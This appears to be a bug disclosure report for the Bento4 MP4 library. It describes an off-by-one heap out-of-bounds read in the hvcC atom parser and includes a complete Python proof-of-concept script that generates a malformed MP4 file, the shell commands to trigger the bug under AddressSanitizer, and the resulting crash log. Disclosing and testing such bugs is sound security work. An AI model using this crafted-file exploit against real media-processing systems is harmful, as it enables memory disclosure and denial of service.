## Bug0: Off-by-One Heap OOB Read in AP4_HvccAtom Constructor

In `AP4_HvccAtom::AP4_HvccAtom` in `Bento4/Source/C++/Core/Ap4HvccAtom.cpp`, the boundary guard at line 255 uses a strict less-than check (`if (payload_size < 22) return;`) that fails to block execution when `payload_size` equals exactly 22, allowing the subsequent access of `payload[22]` at line 282 to read one byte past the end of the allocated 22-byte buffer, resulting in a heap-buffer-overflow.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
import struct, sys, os

def box(type4, data=b''):
    return struct.pack('>I', 8 + len(data)) + type4.encode() + data

def fullbox(type4, version, flags, data=b''):
    return box(type4, struct.pack('>I', (version << 24) | (flags & 0xFFFFFF)) + data)

# ftyp box
ftyp = box('ftyp',
    b'isom' +
    struct.pack('>I', 0x200) +
    b'isomiso2'
)

# mvhd (version 0)
mvhd_data = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 1000) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00' +
    b'\x00' * 24 +
    struct.pack('>I', 2)
)
mvhd = fullbox('mvhd', 0, 0, mvhd_data)

# tkhd (version 0)
tkhd_data = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 1) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    b'\x00' * 8 +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00' +
    struct.pack('>I', 320 << 16) +
    struct.pack('>I', 240 << 16)
)
tkhd = fullbox('tkhd', 0, 3, tkhd_data)

# mdhd (version 0)
mdhd_data = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 90000) +
    struct.pack('>I', 0) +
    struct.pack('>H', 0x55C4) +
    struct.pack('>H', 0)
)
mdhd = fullbox('mdhd', 0, 0, mdhd_data)

# hdlr (vide handler)
hdlr_data = (
    struct.pack('>I', 0) +
    b'vide' +
    b'\x00' * 12 +
    b'VideoHandler\x00'
)
hdlr = fullbox('hdlr', 0, 0, hdlr_data)

# vmhd
vmhd = fullbox('vmhd', 0, 1, struct.pack('>H', 0) + b'\x00' * 6)

# url_ (self-contained, flags=1)
url_ = fullbox('url ', 0, 1, b'')

# dref
dref_data = struct.pack('>I', 1) + url_
dref = fullbox('dref', 0, 0, dref_data)

# dinf
dinf = box('dinf', dref)

# hvcC atom: 8-byte header + exactly 22 bytes of payload = 30 bytes total
# payload_size = 30 - 8 = 22
# Guard: if (22 < 22) return; -> False -> continues
# OOB read: payload[22] reads 1 byte past end of 22-byte buffer
hvcc_payload = b'\x00' * 22
hvcc = struct.pack('>I', 30) + b'hvcC' + hvcc_payload

# hvc1 visual sample entry
hvc1_entry = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    b'\x00' * 12 +
    struct.pack('>H', 320) +
    struct.pack('>H', 240) +
    struct.pack('>I', 0x00480000) +
    struct.pack('>I', 0x00480000) +
    struct.pack('>I', 0) +
    struct.pack('>H', 1) +
    b'\x00' * 32 +
    struct.pack('>H', 0x0018) +
    struct.pack('>H', 0xFFFF) +
    hvcc
)
assert len(hvc1_entry) == 108
assert len(hvcc) == 30
hvc1 = box('hvc1', hvc1_entry)

# stsd
stsd_data = struct.pack('>I', 1) + hvc1
stsd = fullbox('stsd', 0, 0, stsd_data)

# stts, stsc, stsz, stco (empty)
stts = fullbox('stts', 0, 0, struct.pack('>I', 0))
stsc = fullbox('stsc', 0, 0, struct.pack('>I', 0))
stsz = fullbox('stsz', 0, 0, struct.pack('>I', 0) + struct.pack('>I', 0))
stco = fullbox('stco', 0, 0, struct.pack('>I', 0))

stbl = box('stbl', stsd + stts + stsc + stsz + stco)
minf = box('minf', vmhd + dinf + stbl)
mdia = box('mdia', mdhd + hdlr + minf)
trak = box('trak', tkhd + mdia)
moov = box('moov', mvhd + trak)

mp4 = ftyp + moov

with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)

print(f"Written {len(mp4)} bytes to poc_input.mp4")
print("hvcC atom: total size=30, payload=22 bytes")
print("Guard check: (22 < 22) = False -> does NOT return")
print("OOB read: payload[22] reads 1 byte past end of 22-byte buffer")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==161262==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5030000002c6 at pc 0x55cd64d5532e bp 0x7ffdb1f96f50 sp 0x7ffdb1f96f40
READ of size 1 at 0x5030000002c6 thread T0
SUMMARY: AddressSanitizer: heap-buffer-overflow (/path/to/mp42aac+0xb0a32d) in AP4_HvccAtom::AP4_HvccAtom(unsigned int, unsigned char const*)

### Impact

An attacker who supplies a crafted MP4 file with an hvcC box whose declared size yields exactly 22 bytes of payload can trigger a one-byte heap-buffer-overflow read in `AP4_HvccAtom::AP4_HvccAtom`, which may expose one byte of adjacent heap memory containing allocator metadata, pointer fragments, or data from neighboring allocations, constituting an information disclosure primitive. This vulnerability is exposed to any user or pipeline that invokes mp42aac on untrusted input, and under adversarial heap layout it may also cause a process crash, providing a denial-of-service condition.
